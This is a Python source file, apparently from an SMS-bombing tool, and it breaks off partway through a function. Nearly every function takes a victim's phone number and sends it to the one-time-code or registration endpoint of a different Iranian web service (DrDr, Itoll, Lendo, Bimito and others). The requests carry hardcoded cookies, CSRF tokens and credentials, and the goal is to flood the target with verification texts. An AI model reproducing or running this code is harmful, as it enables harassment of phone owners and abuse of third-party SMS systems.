def drdr(phone):
    dru = f"https://drdr.ir/api/registerEnrollment/sendDisposableCode"
    drh = {'Connection': 'keep-alive',
    'Accept': 'application/json',
    'Authorization': 'hiToken',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://drdr.ir',
    'Referer': 'https://drdr.ir/',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate'}
    try:
        drdr = post(timeout=5, url=dru, headers=drh, params={"phoneNumber":phone ,"userType":"PATIENT"}).json()
        if drdr['status'] == 'success':
            print(f'{g}(DrDr) {w}Code Was Sent')
            return True
    except:
        pass

def itool(phone):
    itJ = {'mobile': phone}
    itU = 'https://app.itoll.ir/api/v1/auth/login'
    itH = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'fa',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://itoll.ir',
        'referer': 'https://itoll.ir/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2 Safari/537.36'
}
    try:
        ok = post(timeout=5, url=itU, headers=itH, json=itJ).json()
        if ok['success'] == True:
            print(f'{g}(Itool) {w}Code Was Sent')
            return True
    except:
        pass

def anar(phone):
    anrJ = {'user': phone, 'app_id': 99}
    anrU = 'https://api.anargift.com/api/people/auth'
    anrH = {
'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '34',
'content-type': 'application/json;charset=UTF-8',
'origin': 'https://anargift.com',
'referer': 'https://anargift.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    }
    try:
        ok = post(timeout=5, url=anrU, headers=anrH, json=anrJ).json()      
        if ok['status'] == True:
            print(f'{g}(AnarGift) {w}Code Was Sent')
            return True
    except :
        pass

def azki(phone):
    azkU = f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_{phone}"%7D'
    azkH = {
'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==',
'device': 'web',
'deviceid': '6',
'password': 'BimitoSecret',
'origin': 'https://www.azki.com',
'referer': 'https://www.azki.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'user-token': 'LW6H4KSMStwwKXWeFey05gtdw2iW8QRtSk70phP6tBJindQ4irdzTmSqDI9TkVqE',
'username': 'BimitoClient'
    }
    try:
        ok = post(timeout=5, url=azkU, headers=azkH).json()
        if ok["messageCode"] == 201:
            print(f'{g}(Azki) {w}Code Was Sent')
            return True
    except:
        pass

def nobat(phone):
    noJ = {'mobile': phone}
    noU = 'https://nobat.ir/api/public/patient/login/phone'
    noH = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'access-control-request-headers': 'nobat-cookie',
'access-control-request-method': 'POST',
'origin': 'https://user.nobat.ir',
'referer': 'https://user.nobat.ir/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    }
    try:
        ok = post(timeout=5, url=noU, headers=noH, json=noJ).json()
        if ok["status"] != 'failed':
            return True
    except:
        pass
def chmdon(phone):
    chJ = {
    "mobile": '0'+phone.split('+98')[1],
    "origin": "/",
    "referrer_id": None
    }
    chU = 'https://chamedoon.com/api/v1/membership/guest/request_mobile_verification'
    chH = {
'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/json;charset=UTF-8',
'cookie': 'activity=%7B%22referrer_id%22%3Anull%2C%22origin%22%3A%22%2F%22%7D',
'origin': 'https://chamedoon.com',
'referer': 'https://chamedoon.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    }
    try:
        ok = post(timeout=5, url=chU, headers=chH, json=chJ).json()
        if ok["status"] == 'ok':
            print(f'{g}(Chamedoon) {w}Code Was Sent')
            return True
    except:
        pass
    
def bn(phone):
    bnJ = {
    "phone": '0'+phone.split('+98')[1]
}
    bnU = 'https://mobapi.banimode.com/api/v2/auth/request'
    bnH = {
'Accept': '*/*',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Access-Control-Request-Headers': 'content-type,platform',
'Access-Control-Request-Method': 'POST',
'Connection': 'keep-alive',
'Host': 'mobapi.banimode.com',
'Origin': 'https://www.banimode.com',
'Referer': 'https://www.banimode.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    }
    try:
        ok = post(timeout=5, url=bnU, headers=bnH, json=bnJ).json()
        if ok["status"] == 'success':
            print(f'{g}(BaniMode) {w}Code Was Sent')
            return True
    except:
        pass
    
def lendo(phone):
    leD = {'_token': 'mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6',
'mobile': '0'+phone.split('+98')[1],
'password': 'ibvvb@3#9nc'}
    leU = 'https://lendo.ir/register?'
    leH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Cache-Control': 'max-age=0',
'Connection': 'keep-alive',
'Content-Type': 'application/x-www-form-urlencoded',
'Cookie': 'lendo_session=eyJpdiI6Imh2QXVnS3Q1ejFvQllhSVgzRTZORVE9PSIsInZhbHVlIjoicFE0VzJWc016a3BHXC9CRTE3S21OSXV0XC84U015VTJwdDBRVWZNUDRIUmxmS1gwSDR5NVEwQlhmaUlMdTM2XC9EQyIsIm1hYyI6ImMzMWRhYWE1ODA3MTE1ZGI5ZGIxNTAxNTg5NzBhNWYzNjZjNzk2MDNhYWNlNTU1OTc5ZTYzNjNmYWU5OGZiMWIifQ%3D%3D',
'Host': 'lendo.ir',
'Origin': 'https://lendo.ir',
'Referer': 'https://lendo.ir/register',
'Upgrade-Insecure-Requests': '1',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        lendoR = post(timeout=5, url=leU, headers=leH, data=leD).text
        if 'تایید شماره تلفن همراه' in lendoR:
            print(f'{g}(Lendo) {w}Code Was Sent')
            return True
    except:
        pass
def olgoo(phone):
    olD = {'contactInfo[mobile]': '0'+phone.split('+98')[1],
'contactInfo[agreementAccepted]': '1',
'contactInfo[teachingFieldId]': '1',
'contactInfo[eduGradeIds][7]': '7',
'submit_register': '1'}
    olU = 'https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox'
    olH = {'Accept': 'text/plain, */*; q=0.01',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Connection': 'keep-alive',
'Content-Length': '163',
'Content-Type': 'application/x-www-form-urlencoded',
'Cookie': 'PHPSESSID=l1gv6gp0osvdqt4822vaianlm5',
'Host': 'www.olgoobooks.ir',
'Origin': 'https://www.olgoobooks.ir',
'Referer': 'https://www.olgoobooks.ir/sn/userRegistration/',
'X-Requested-With': 'XMLHttpRequest',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        olgoo = post(timeout=5, url=olU, headers=olH, data=olD).text
        if 'مدت زمان باقی‌مانده تا دریافت مجدد کد' in olgoo:
            print(f'{g}(NashrOlgoo) {w}Code Was Sent')
            return True
    except:
        pass
    
def pakhsh(phone):
    paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo=0{phone.split("+98")[1]}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'
    paU = 'https://www.pakhsh.shop/wp-admin/admin-ajax.php'
    paH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '143',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'cookie': 'digits_countrycode=98; _wpfuuid=b21e7550-db54-469f-846d-6993cfc4815d',
'origin': 'https://www.pakhsh.shop',
'referer': 'https://www.pakhsh.shop/%D9%85%D8%B1%D8%A7%D8%AD%D9%84-%D8%AB%D8%A8%D8%AA-%D8%B3%D9%81%D8%A7%D8%B1%D8%B4-%D9%88-%D8%AE%D8%B1%DB%8C%D8%AF/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'x-requested-with': 'XMLHttpRequest'}
    try:
        ok = post(timeout=5, url=paU, headers=paH, data=paD).json()
        if ok['code'] == '1':
            print(f'{g}(PakhshShop) {w}Code Was Sent')
            return True
    except:
        pass
def didnegar(phone):
    paD = f'action=digits_check_mob&countrycode=%2B98&mobileNo={phone.split("+98")[1]}&csrf=4c9ac22ff4&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=0{phone.split("+98")[1]}&dig_otp=&digits_login_remember_me=1&dig_nounce=4c9ac22ff4'
    paU = 'https://www.didnegar.com/wp-admin/admin-ajax.php'
    paH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '143',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'cookie': 'PHPSESSID=881f0d244b83c1db49d4c39e5fe7b108; digits_countrycode=98; _5f9d3331dba5a62b1268c532=true',
'origin': 'https://www.didnegar.com',
'referer': 'https://www.didnegar.com/my-account/?login=true&back=home&page=1',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'x-requested-with': 'XMLHttpRequest'}
    try:
        ok = post(timeout=5, url=paU, headers=paH, data=paD).json()
        if ok['code'] == '1':
            print(f'{g}(DideNegar) {w}Code Was Sent')
            return True
    except:
        pass
def baskol(phone):
    baJ = {
    "phone": '0'+phone.split('+98')[1]
}
    baU = 'https://www.buskool.com/send_verification_code'
    baH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/json;charset=UTF-8',
'cookie': 'laravel_session=2Gp6A82VC8CPMgaB7sI0glrGP52XyjXNKnNAeZq3',
'origin': 'https://www.buskool.com',
'referer': 'https://www.buskool.com/register',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
'x-csrf-token': 'trUVHIRWtjE58Fn9Pud1ciz2XaTbTgFHgCLsPykD',
'x-requested-with': 'XMLHttpRequest'}
    try:
        ok = post(timeout=5, url=baU, headers=baH, json=baJ).json()
        if ok['status'] == True:
            print(f'{g}(Baskol) {w}Code Was Sent')
            return True
    except:
        pass
def kilid(phone):
    kiJ = {
    "mobile": '0'+phone.split('+98')[1]
}
    kiU = 'https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL'
    kiH = {'Accept': 'application/json, text/plain, */*',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Connection': 'keep-alive',
'Content-Type': 'application/json',
'COUNTRY_ID': '2',
'Host': 'server.kilid.com',
'LOCALE': 'FA',
'Origin': 'https://kilid.com',
'Referer': 'https://kilid.com/',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ok = post(timeout=5, url=kiU, headers=kiH, json=kiJ).json()
        if ok['status'] == 'SUCCESS':
            print(f'{g}(Kilid) {w}Code Was Sent')
            return True
    except:
        pass
def basalam(phone):
    baJ = {
    "variables": {
        "mobile": '0'+phone.split('+98')[1]
    },
    "query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"
}
    baU = 'https://api.basalam.com/user'
    baH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'authorization': 'Bearer undefined',
'content-length': '168',
'content-type': 'application/json;charset=UTF-8',
'origin': 'https://basalam.com',
'referer': 'https://basalam.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23',
'x-client-info': '{"name":"web.public"}',
'x-creation-tags': '{"app":"web","client":"customer","os":"linux","device":"desktop","uri":"/accounts","fullPath":"/accounts","utms":"organic","landing_url":"basalam.com%2Faccounts","tag":[null]}'}
    try:
        ok = post(timeout=5, url=baU, headers=baH, json=baJ)
        if ok.status_code == 200:
            print(f'{g}(BaSalam) {w}Code Was Sent')
            return True
    except:
        pass
def see5(phone):
    seD = {'mobile': '0'+phone.split('+98')[1],
'action': 'sendsms'}
    seU = 'https://crm.see5.net/api_ajax/sendotp.php'
    seH = {'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '33',
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
'cookie': '_ga=GA1.2.1824452401.1639326535; _gid=GA1.2.438992536.1639326535; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; crisp-client%2Fsession%2Fc55c0d24-98fe-419a-862f-0b31e955fd59=session_812ec81d-13c1-4a69-a494-ad54e1f290ef; __utma=55084201.1824452401.1639326535.1639326540.1639326540.1; __utmc=55084201; __utmz=55084201.1639326540.1.1.utmcsr=Ads|utmgclid=EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE|utmccn=Exact-shopsaz|utmcmd=cpc|utmctr=(not%20provided); _gac_UA-62787234-1=1.1639326540.EAIaIQobChMIsfOridfe9AIV5o5oCR2zJQjCEAMYAiAAEgLT8fD_BwE; __utmt=1; __utmb=55084201.3.10.1639326540; WHMCSkYBsAa1NDZ2k=6ba6de855ce426e25ea6bf402d1dc09c',
'origin': 'https://crm.see5.net',
'referer': 'https://crm.see5.net/clientarea.php',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23',
'x-requested-with': 'XMLHttpRequest'}
    ok = post(timeout=5, url=seU, headers=seH, data=seD).text
    try:
        if ok == 'send_sms':
            print(f'{g}(See5) {w}Code Was Sent')
            return True
    except:
        pass
def ghabzino(phone):
    ghJ = {
    "Parameters": {
        "ApplicationType": "Web",
        "ApplicationUniqueToken": None,
        "ApplicationVersion": "1.0.0",
        "MobileNumber": '0'+phone.split('+98')[1]
    }
}
    ghU = 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode'
    ghH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/json',
'origin': 'https://ghabzino.com',
'referer': 'https://ghabzino.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ok = get(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
        if ok["Parameters"] != None:
            print(f'{g}(Ghabzino) {w}Code Was Sent')
            return True
    except:
        pass
def simkhanF(phone):
    ghJ = {
    "mobileNumber": '0'+phone.split('+98')[1],
    "ReSendSMS": False
}
    ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
    ghH = {'Accept': 'application/json',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Authorization': 'Bearer undefined',
'Connection': 'keep-alive',
'Content-Type': 'application/json',
'Host': 'www.simkhanapi.ir',
'Origin': 'https://simkhan.ir',
'Referer': 'https://simkhan.ir/',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ok = post(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
        if ok['Message'] == "ثبت نام شما با موفقیت انجام شد":
            print(f'{g}(SimKhan) {w}Code Was Sent')
            return True
    except:
        pass
def simkhanT(phone):
    ghJ = {
    "mobileNumber": '0'+phone.split('+98')[1],
    "ReSendSMS": True
}
    ghU = 'https://www.simkhanapi.ir/api/users/registerV2'
    ghH = {'Accept': 'application/json',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Authorization': 'Bearer undefined',
'Connection': 'keep-alive',
'Content-Type': 'application/json',
'Host': 'www.simkhanapi.ir',
'Origin': 'https://simkhan.ir',
'Referer': 'https://simkhan.ir/',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ok = post(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
        if ok['Message'] == "این است قدرت علی زد ایکس":
            print(f'{g}(SimKhan) {w}Code Was Sent')
            return True
    except:
        pass
def drsaina(phone):
    ghD = f"__RequestVerificationToken=CfDJ8NPBKm5eTodHlBQhmwjQAVUgCtuEzkxhMWwcm9NyjTpueNnMgHEElSj7_JXmfrsstx9eCNrsZ5wiuLox0OSfoEvDvJtGb7NC5z6Hz7vMEL4sBlF37_OryYWJ0CCm4gpjmJN4BxSjZ24pukCJF2AQiWg&noLayout=False&action=checkIfUserExistOrNot&lId=&codeGuid=00000000-0000-0000-0000-000000000000&PhoneNumber={'0'+phone.split('+98')[1]}&confirmCode=&fullName=&Password=&Password2="
    ghU = 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation'
    ghH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cache-control': 'max-age=0',
'content-type': 'application/x-www-form-urlencoded',
'cookie': '.AspNetCore.Antiforgery.ej9TcqgZHeY=CfDJ8NPBKm5eTodHlBQhmwjQAVWqg8-UO73YXzMYVhYk28IlZQexrnyEhYldxs2Ylnp3EZE2o3tccNQ0E7vRSUGVMNDfmcFOKPcUCG7sysT7unE5wui_vwzMvyCNDqIRZ1Wxd2AKD3s3lu-2BvFOXc_j7ts; anonymousId=-fmvaw07O1miRXbHtKTVT; segmentino-user={"id":"-fmvaw07O1miRXbHtKTVT","userType":"anonymous"}; _613757e830b8233caf20b7d3=true; _ga=GA1.2.1051525883.1639482327; _gid=GA1.2.2109855712.1639482327; __asc=bf42042917db8c3006a2b4dcf49; __auc=bf42042917db8c3006a2b4dcf49; analytics_token=a93f2bb1-30d0-4e99-18cc-b84fcda27ae9; yektanet_session_last_activity=12/14/2021; _yngt_iframe=1; _gat_UA-126198313-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_session_token=efcee442-344d-1374-71b8-60ca960029c9; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _gac_UA-126198313-1=1.1639482345.EAIaIQobChMImrmRrJvj9AIV2ZTVCh07_gUpEAAYASAAEgILoPD_BwE; cache_events=true',
'origin': 'https://www.drsaina.com',
'referer': 'https://www.drsaina.com/RegisterLogin?ReturnUrl=%2Fconsultation',
'upgrade-insecure-requests': '1',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ok = post(timeout=5, url=ghU, headers=ghH, data=ghD).text
        if 'کد تایید 6 رقمی پیامک شده به شماره' in ok:
            print(f'{g}(DrSaina) {w}Code Was Sent')
            return True
    except:
        pass
def binjo(phone):
    ghU = f"https://api.binjo.ir/api/panel/get_code/{'0'+phone.split('+98')[1]}"
    ghH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Cache-Control': 'max-age=0',
'Connection': 'keep-alive',
'Cache-Control': 'no-cache, private',
'Content-Encoding': 'gzip',
'Content-Type': 'application/json',
'Cookie': 'laravel_session=eyJpdiI6InY0T2JYTndZb0xacURzcXFtWWxORHc9PSIsInZhbHVlIjoiUmo1bVd0UklmdjJyc1wvZGNHVDRuRU96RVZVZFhpb1N4ZmJ3NkduUGJYMGhyRG42QVNwVUNHVlZZRUNqV0hjUysiLCJtYWMiOiIzNTBlOWIzOTkxMDYyM2EzNzViYWFhYjdkM2FlNjQ1YmZjOTU3NzNiMjRlYjNlMmZiZmQzOGRkZTI0Yzc0NTU1In0%3D',
'Host': 'api.binjo.ir',
'Upgrade-Insecure-Requests': '1',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ok = get(timeout=5, url=ghU, headers=ghH, verify=False).json()
        if ok['status'] == 'ok':
            print(f'{g}(BinJo) {w}Code Was Sent')
            return True
    except:
        pass
def limome(phone):
    liD = {'mobileNumber': phone.split('+98')[1],
'country': '1'}
    liU = 'https://my.limoome.com/api/auth/login/otp'
    liH = {'Accept': 'application/json, text/javascript, */*; q=0.01',
'Accept-Encoding': 'gzip, deflate, br',
'Accept-Language': 'en-US,en;q=0.9',
'Connection': 'keep-alive',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Cookie': 'sess=00da3860-929a-4429-aef9-82bb64f9a439; basalam-modal=1',
'Host': 'my.limoome.com',
'Origin': 'https://my.limoome.com',
'Referer': 'https://my.limoome.com/login?redirectlogin=%252Fdiet%252Fpayment',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
'X-Requested-With': 'XMLHttpRequest'}
    try:
        liR = post(timeout=5, url=liU, headers=liH, data=liD).json()
        if liR['status'] == 'success':
            print(f'{g}(Limome) {w}Code Was Sent')
            return True
    except:
        pass
def bimito(phone):
    liU = f"https://bimito.com/api/core/app/user/checkLoginAvailability/%7B%22phoneNumber%22%3A%220{phone.split('+98')[1]}%22%7D"
    liH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cookie': '_gcl_aw=GCL.1639580987.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _gcl_au=1.1.1134321035.1639580987; _ga=GA1.2.74824389.1639580987; _gid=GA1.2.40868592.1639580992; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=9fbae680-00a7-8cbf-6be6-90980eae790f; yektanet_session_last_activity=12/15/2021; _yngt_iframe=1; _gac_UA-89339097-1=1.1639580999.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _clck=dlyt9o|1|exa|0; crisp-client%2Fsession%2Fbde9082c-438a-4943-b9b5-362fed0a182a=session_2fdd45a5-8c9d-4638-b21a-40a2ebd422db; _clsk=ktdj0|1639581807259|2|1|d.clarity.ms/collect; _ga_5LWTRKET98=GS1.1.1639580986.1.1.1639581904.60',
'device': 'web',
'deviceid': '3',
'origin': 'https://bimito.com',
'referer': 'https://bimito.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
    try:
        liR = post(timeout=5, url=liU, headers=liH).json()
        if liR['message'] == 'کاربر قبلا ثبت نام نکرده است':
            print(f'{g}(BimitoVip) {w}Code Was Sent')
            return True
    except:
        pass
def bimitoVip(phone):
    liU = f"https://bimito.com/api/core/app/user/loginWithVerifyCode/%7B%22phoneNumber%22:%220{phone.split('+98')[1]}%22%7D"
    liH = {'accept': 'application/json, text/plain, */*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cookie': '_gcl_aw=GCL.1639580987.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _gcl_au=1.1.1134321035.1639580987; _ga=GA1.2.74824389.1639580987; _gid=GA1.2.40868592.1639580992; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22cpc%22%2C%22campaign%22:%22adwords%22%2C%22content%22:%22adwords%22}; analytics_token=9fbae680-00a7-8cbf-6be6-90980eae790f; yektanet_session_last_activity=12/15/2021; _yngt_iframe=1; _gac_UA-89339097-1=1.1639580999.EAIaIQobChMI1t3Y-Irm9AIVk4xoCR0UowKLEAAYASAAEgLCS_D_BwE; _yngt=d628b56e-eef52-280a4-4afe0-012e33e23ce9b; _clck=dlyt9o|1|exa|0; crisp-client%2Fsession%2Fbde9082c-438a-4943-b9b5-362fed0a182a=session_2fdd45a5-8c9d-4638-b21a-40a2ebd422db; _clsk=ktdj0|1639581807259|2|1|d.clarity.ms/collect; _ga_5LWTRKET98=GS1.1.1639580986.1.1.1639581904.60',
'device': 'web',
'deviceid': '3',
'origin': 'https://bimito.com',
'referer': 'https://bimito.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33',
'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
    try:
        liR = post(timeout=5, url=liU, headers=liH).json()
        if liR['message'] == 'کاربر قبلا ثبت نام نشده است':
            print(f'{g}(BimitoVip) {w}Code Was Sent')
            return True
    except:
        pass
def seebirani(phone):
    liJ = {
    "username": "0"+phone.split('+98')[1]
}
    liU = "https://sandbox.sibirani.ir/api/v1/user/invite"
    liH = {'accept': 'application/json',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/json',
'origin': 'https://developer.sibirani.com',
'referer': 'https://developer.sibirani.com/',
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        post(timeout=5, url=liU, headers=liH, json=liJ)
        print(f'{g}(SeebIrani) {w}Code Was Sent')
        return True
    except:
        pass
def mihanpezeshk(phone):
    gaD = f'_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={"0"+phone.split("+98")[1]}&recaptcha='
    gaU = 'https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient'
    gaH = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'cache-control': 'max-age=0',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'XSRF-TOKEN=eyJpdiI6IitzYVZRQzFLdGlKNHRHRjIxb3R4VWc9PSIsInZhbHVlIjoianR6SXBJXC9rUStMRCs0ajUzalNjM1pMN053bUNtSlJ5dzYrVzFxV1dtXC9SREp4OTJ0Wm1RWW9yRVwvM29Cc3l4SCIsIm1hYyI6IjdjODczZWI4Y2Q2N2NhODVkNjE5YTRkOWVhNjRhNDRlNmViZjhlNDVkNDYwODFkNzViOTU2ZTdjYTUwZjhjMWUifQ%3D%3D; laravel_session=eyJpdiI6ImU3dlpRdXV1XC9TMmJEWk1LMkFTZGJRPT0iLCJ2YWx1ZSI6IktHTWF0bFlJU0VqVCthamp5aW1GRHdBM1lNcjNMcVFxMWM5Ynd3clZLQzdva2ZJWXRiRU4xaUhyMnVHMG90RkUiLCJtYWMiOiJkZWRmMGM5YzFiNDNiOTJjYWFiZDc0MjYxMDUyMzBmYTMzMmI5ZTBkODA1YTMxODQyYzM2NjVjZWExZmYwMzdhIn0%3D',
'origin': 'https://www.mihanpezeshk.com',
